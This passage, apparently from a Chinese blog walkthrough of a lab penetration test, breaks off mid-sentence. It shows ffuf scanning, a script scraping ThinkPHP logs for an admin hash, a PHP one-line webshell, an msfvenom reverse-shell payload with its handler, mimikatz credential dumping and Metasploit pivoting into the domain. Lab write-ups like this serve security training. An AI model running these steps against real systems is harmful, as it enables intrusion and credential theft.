id="ffufç›®å½•æ–‡ä»¶æ‰«æ">ffufç›®å½•æ–‡ä»¶æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://www.webhack123.com/FUZZ -w Wordslist/all.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125641975.png" alt="image-20250512125641975"></p><h3 id="wc-dbæ–‡ä»¶ä¸‹è½½">wc.dbæ–‡ä»¶ä¸‹è½½</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.webhack123.com/.svn/wc.db</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130405171.png" alt="image-20250512130405171"></p><p>ä½¿ç”¨<code>Navicat</code>æ‰“å¼€æ•°æ®åº“ï¼Œå¯ä»¥çœ‹å‡ºä½¿ç”¨åˆ°çš„æ¡†æ¶ä¸º<code>thinkphp</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130708281.png" alt="image-20250512130708281"></p><h3 id="thinkphpæ—¥å¿—æ–‡ä»¶æ³„éœ²">thinkphpæ—¥å¿—æ–‡ä»¶æ³„éœ²</h3><p>åœ¨<code>thinkphp_3.1.3</code>ä¸­ï¼Œæ—¥å¿—æ–‡ä»¶æ˜¯å¼€å¯çš„ï¼Œç”±<code>wc.db</code>å¯ä»¥çŸ¥é“ç›®å½•ä½ç½®ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512131128450.png" alt="image-20250512131128450"></p><p>æ—¥å¿—è·¯å¾„æ ¼å¼å¦‚ï¼š<a href="http://www.webhack123.com/App/Runtime/Logs/18_06_28.log">http://www.webhack123.com/App/Runtime/Logs/18_06_28.log</a></p><h3 id="æå–æ—¥å¿—è·å–å¯†ç ">æå–æ—¥å¿—è·å–å¯†ç </h3><p>ä½¿ç”¨<code>python</code>ç¼–å†™æ—¥å¿—æ–‡ä»¶æå–è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#codingï¼šutf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_urls</span>(<span class="params">patch,y</span>):</span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line">urls = add_urls(url,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    req=requests.get(i)</span><br><span class="line">    <span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;webhack123.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html)</span><br></pre></td></tr></table></figure><p>è·å–æ—¥å¿—ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­æŸ¥æ‰¾åˆ°æ³„éœ²çš„ç®¡ç†å‘˜å¯†ç ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132623141.png" alt="image-20250512132623141"></p><p>è´¦å·ä¸º<code>admin</code>ï¼Œå¯†ç çš„å“ˆå¸Œä¸º<code>74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</code>ï¼Œç»è¿‡<code>cmd5</code>å¾—å‡ºå¯†ç ä¸º<code>web123</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132826440.png" alt="image-20250512132826440"></p><h3 id="hostç¢°æ’ç®¡ç†åå°å­åŸŸå">hostç¢°æ’ç®¡ç†åå°å­åŸŸå</h3><p>å¦‚æœæ‰«æç›®å½•è¿˜æ˜¯æ‰¾ä¸åˆ°åå°ï¼Œå¯ä»¥å°è¯•è¿›è¡Œ<code>host</code>ç¢°æ’å‡ºå­åŸŸåã€‚</p><p>ä»£ç å‚è€ƒ<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ï¼Œå˜åŠ¨äº†ä¸€ä¸‹ä»£ç ï¼Œ<code>ip.txt</code>ç”¨äºå­˜æ”¾ç›®æ ‡çš„<code>IP</code>åœ°å€ï¼Œ<code>host.txt</code>ç”¨äºå­˜æ”¾å­åŸŸåå‰ç¼€ã€‚è¿™é‡Œæ˜¯<code>http</code>ï¼Œä¸éœ€è¦è¿›è¡Œ<code>https</code>çš„çˆ†ç ´ã€‚è¿è¡Œä»£ç ï¼Œå­åŸŸåå’Œ<code>IP</code>åœ°å€è¿›è¡ŒåŒ¹é…ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#è¿™æ˜¯ä¸€ä¸ªç”¨äºIPå’ŒåŸŸåç¢°æ’åŒ¹é…è®¿é—®çš„å°å·¥å…·(ä¿®æ”¹è¿‡)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lists=[]</span><br><span class="line">files = <span class="built_in">open</span>(<span class="string">&#x27;hosts_ok.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="comment">#è¯»å–IPåœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================å¼€ å§‹ åŒ¹ é…====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> iplist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>):</span><br><span class="line">    ip = iplist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¯»å–hoståœ°å€</span></span><br><span class="line">    <span class="comment">#http_s = [&#x27;http://&#x27;,&#x27;https://&#x27;]</span></span><br><span class="line">    http_s = [<span class="string">&#x27;http://&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> http_s :</span><br><span class="line">        <span class="keyword">for</span> hostlist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;host.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">            tmp = hostlist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            host = tmp+<span class="string">&#x27;.webhack123.com&#x27;</span></span><br><span class="line">            headers = &#123;<span class="string">&#x27;Host&#x27;</span>:host,<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.session()</span><br><span class="line">                requests.packages.urllib3.disable_warnings()</span><br><span class="line">                rhost = r.get(h + ip,verify=<span class="literal">False</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">                rhost.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                title = re.search(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, rhost.text).group(<span class="number">1</span>) <span class="comment">#è·å–æ ‡é¢˜</span></span><br><span class="line">                info = <span class="string">&#x27;%s -- %s åè®®ï¼š%s æ•°æ®åŒ…å¤§å°ï¼š%d æ ‡é¢˜ï¼š%s&#x27;</span> % (ip,host,h,<span class="built_in">len</span>(rhost.text),title)</span><br><span class="line">                lists.append(info)</span><br><span class="line">                files.write(info + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(info)</span><br><span class="line">            <span class="keyword">except</span> Exception :</span><br><span class="line">                error = ip + <span class="string">&quot; --- &quot;</span> + host + <span class="string">&quot; --- è®¿é—®å¤±è´¥ï¼~&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(error)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================åŒ¹ é… æˆ åŠŸ çš„ åˆ— è¡¨====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ª<code>admin.webhack123.com</code>å­åŸŸåã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143022860.png" alt="image-20250512143022860"></p><p>æˆåŠŸæ‰¾åˆ°äº†åå°çš„ç®¡ç†ç«™ç‚¹ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143257291.png" alt="image-20250512143257291"></p><p>æ ¹æ®å‰é¢è·å–åˆ°çš„è´¦å·å¯†ç <code>admin/web123</code>å¯ä»¥ç™»é™†ç®¡ç†å‘˜ç•Œé¢ã€‚</p><h3 id="ä¸Šä¼ æ–‡ä»¶è·å–webshell">ä¸Šä¼ æ–‡ä»¶è·å–webshell</h3><p>ç™»é™†åˆ°ç®¡ç†å‘˜ç•Œé¢åï¼Œè¿›è¡Œæ–‡ä»¶çš„ä¸Šä¼ ã€‚è®¾ç½®å…è®¸ä¸Šä¼ <code>php</code>ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<code>&lt;?php @eval($_POST['pass']);?&gt;</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512144703229.png" alt="image-20250512144703229"></p><p>ä¸Šä¼ æˆåŠŸï¼Œè·å–<code>shell</code>çš„<code>url</code>ä¸º<code>http://admin.webhack123.com/Public/Upload/20250512/d58f8404ac973d0352c666b9f83056a9.php</code>ï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512145624138.png" alt="image-20250512145624138"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512150325172.png" alt="image-20250512150325172"></p><h2 id="MSFè¿›è¡Œææƒå’Œä¿¡æ¯æ”¶é›†">MSFè¿›è¡Œææƒå’Œä¿¡æ¯æ”¶é›†</h2><h3 id="ç”Ÿæˆæ”»å‡»è½½è·">ç”Ÿæˆæ”»å‡»è½½è·</h3><p><code>phpstudy</code>ç¯å¢ƒä¸‹ï¼Œä¸Šä¼ å¹¶æ‰§è¡Œ<code>exe</code>æ–‡ä»¶ï¼Œç›´æ¥å°±æ˜¯ç³»ç»Ÿçš„æœ€é«˜æƒé™äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=12345 -f exe -o tt.exe</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬æœºçš„æ ¹ç›®å½•ä¼šç”Ÿæˆä¸€ä¸ª<code>tt.exe</code>æ–‡ä»¶ã€‚</p><h3 id="ç›‘å¬ä¸Šçº¿">ç›‘å¬ä¸Šçº¿</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.1.3</span><br><span class="line">lhost =&gt; 192.168.1.3</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>æˆ‘ä½¿ç”¨çš„æ˜¯<code>mac m1</code>ç¯å¢ƒå®‰è£…çš„<code>msf</code>ï¼Œç›‘å¬å‘ç°ä¸€ç›´æŠ¥é”™ï¼Œè¿æ¥ä¸ä¸Š<code>shell</code>ã€‚è¿™é‡Œæˆ‘å¡äº†å¾ˆä¹…ï¼Œæƒ³ç ´è„‘è¢‹ï¼Œä¹Ÿæ²¡æƒ³åˆ°æŠŠ<code>mac</code>çš„é˜²ç«å¢™å…³äº†å°±å¥½äº†ğŸ˜‘ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513113931755.png" alt="image-20250513113931755"></p><p>æˆåŠŸæ‹¿åˆ°<code>shell</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513114424829.png" alt="image-20250513114424829"></p><h3 id="migrateè¿ç§»è¿›ç¨‹">migrateè¿ç§»è¿›ç¨‹</h3><p>æ‰¾åˆ°åˆé€‚çš„è¿›ç¨‹ï¼Œè¿›è¡Œè¿›ç¨‹çš„è¿ç§»ï¼Œè¿™é‡Œå¾ˆå¤šäººä½¿ç”¨çš„æ˜¯<code>migrate 476</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130552170.png" alt="image-20250513130552170"></p><p>è¿ç§»æˆåŠŸã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130700625.png" alt="image-20250513130700625"></p><h3 id="mimikatzå“ˆå¸Œæ˜æ–‡è·å–">mimikatzå“ˆå¸Œæ˜æ–‡è·å–</h3><p>ä½¿ç”¨<code>load kiwi</code>ï¼ŒåŠ è½½<code>mimikatz</code>æ¨¡å—ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line">creds_wdigest</span><br><span class="line">creds_tspkg</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131257484.png" alt="image-20250513131257484"></p><p><code>arp</code>å¯ä»¥å‘ç°æ›´å¤šçš„ä¸»æœºã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131434911.png" alt="image-20250513131434911"></p><h2 id="è·¨ç½‘æ®µåŸŸæ¸—é€">è·¨ç½‘æ®µåŸŸæ¸—é€</h2><h3 id="MSFè·¨ç½‘æ®µçš„åŸŸæ¸—é€">MSFè·¨ç½‘æ®µçš„åŸŸæ¸—é€</h3><p>ä½¿ç”¨<code>metasploit</code>å’Œ<code>cobalt strike</code>è¿›è¡ŒåŸŸæ¸—é€ã€‚</p><h4 id="ç¡®è®¤åŸŸç¯å¢ƒ">ç¡®è®¤åŸŸç¯å¢ƒ</h4><p><code>ps</code>æŸ¥çœ‹è¿›ç¨‹ï¼Œè¿›è¡Œä»¤ç‰Œçªƒå–ï¼Œå¿…é¡»åˆ‡æ¢åˆ°<code>adminstrator</code>ï¼Œé<code>system</code>ï¼Œæ‰èƒ½ä½¿ç”¨<code>net config workstation</code>âš ï¸</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133145485.png" alt="image-20250513133145485"></p><p>åˆ‡æ¢åˆ°<code>shell</code>ï¼Œç„¶åæ‰§è¡Œ<code>net config workstation</code>ã€‚å‡ºç°ä¹±ç æƒ…å†µæ—¶åœ¨è·å–çš„<code>shell</code>ä¸­æ‰§è¡Œ<code>chcp 65001</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133609467.png" alt="image-20250513133609467"></p><h4 id="å®šä½åŸŸæ§">å®šä½åŸŸæ§</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133723239.png" alt="image-20250513133723239"></p><h4 id="åŸŸä¿¡æ¯æ”¶é›†">åŸŸä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #æŸ¥çœ‹åŸŸæ§æ—¶é—´</span><br><span class="line">net view #éå†ä¿¡ä»»ä¸»æœº</span><br><span class="line">net view /domain #æŸ¥çœ‹åŸŸ</span><br><span class="line">net view /domain:hackbox</span><br><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135625840.png" alt="image-20250513135625840"></p><p><code>ipconfig</code>ç¡®è®¤äº†å­˜åœ¨ä¸¤ä¸ªç½‘æ®µ<code>10.10.10.150</code>å’Œ<code>192.168.1.13</code>ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135931643.png" alt="image-20250513135931643"></p><h4 id="ç»ˆç«¯æ‰§è¡Œä¿¡æ¯æ”¶é›†å‘½ä»¤">ç»ˆç«¯æ‰§è¡Œä¿¡æ¯æ”¶é›†å‘½ä»¤</h4><p><code>ipconfig /all</code>æŸ¥çœ‹ä¿¡æ¯ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140129603.png" alt="image-20250513140129603"></p><p><code>dns 10.10.10.149</code>ï¼Œ<code>dns</code>ä¸€èˆ¬éƒ½æ˜¯ä¸åŸŸæ§åŒä¸€ä¸ª<code>ip</code></p><h4 id="è·å–ç™»é™†è¿‡çš„ç”¨æˆ·ä¿¡æ¯">è·å–ç™»é™†è¿‡çš„ç”¨æˆ·ä¿¡æ¯</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140428684.png" alt="image-20250513140428684"></p><p>è·å–çš„<code>SID</code>å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SID                                            Profile Path</span><br><span class="line">---                                            ------------</span><br><span class="line">S-1-5-18                                       C:\Windows\system32\config\systemprofile</span><br><span class="line">S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line">S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line">S-1-5-21-1443003717-4130318662-4279967973-500  C:\Users\Administrator</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103  C:\Users\web</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-500   C:\Users\Administrator.HACKBOX</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ è·¯ç”±æ¸—é€DCåŸŸæ§">æ·»åŠ è·¯ç”±æ¸—é€<code>DC</code>åŸŸæ§</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æŸ¥çœ‹å…¨å±€è·¯ç”±å™¨</span></span><br><span class="line">run get_local_subnets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æ·»åŠ 10æ®µçš„è·¯ç”±ä¿¡æ¯</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±è¡¨ä¿¡æ¯</span></span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å›é€€ï¼Œå¼€å¯ä»£ç†</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143458109.png" alt="image-20250513143458109"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143516484.png" alt="image-20250513143516484"></p><h4 id="å¼€å¯ä»£ç†é€šåŸŸæ§">å¼€å¯ä»£ç†é€šåŸŸæ§</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä½¿ç”¨ä»£ç†æ¨¡å—</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è®¾ç½®ä»£ç†ç«¯å£</span></span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">set SRVPORT 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹è®¾ç½®çš„æƒ…å†µ</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513193150680.png" alt="image-20250513193150680"></p><p>æ³¨æ„æœ¬åœ°ä½¿ç”¨çš„ä»£ç†é…ç½®æƒ…å†µã€‚æˆ‘æ˜¯ç”¨çš„æ˜¯<code>proxychains4</code>ï¼Œ<code>Mac m</code>ç³»åˆ—å®‰è£…è¿™ä¸ªæˆ‘åˆæŠ˜è…¾å¥½ä¹…ğŸ˜‘ï¼Œå‚è€ƒè¿™ä¸ªæ‰ç»™è§£å†³çš„ï¼Œå®‰è£…<code>proxychains4</code><sup class="footnote-ref"><a href="#fn2" 